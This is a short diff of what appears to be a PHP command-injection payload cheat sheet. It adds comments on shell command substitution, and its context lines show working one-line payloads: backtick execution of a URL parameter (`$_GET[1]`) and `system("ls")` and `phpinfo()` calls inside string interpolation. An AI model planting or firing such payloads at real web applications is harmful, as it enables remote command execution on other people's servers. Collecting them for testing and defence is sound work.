@@ -29,6 +29,10 @@
 // `` won't show the result just as exec, so we also need echo
 echo `$_GET[1]`;&1=ls
 
+// $( cmd )
+// command substitution
+// https://unix.stackexchange.com/questions/147420/what-is-in-a-command
+
 echo "{${phpinfo()}}";
 echo "{${system("ls")}}";
 die("...");
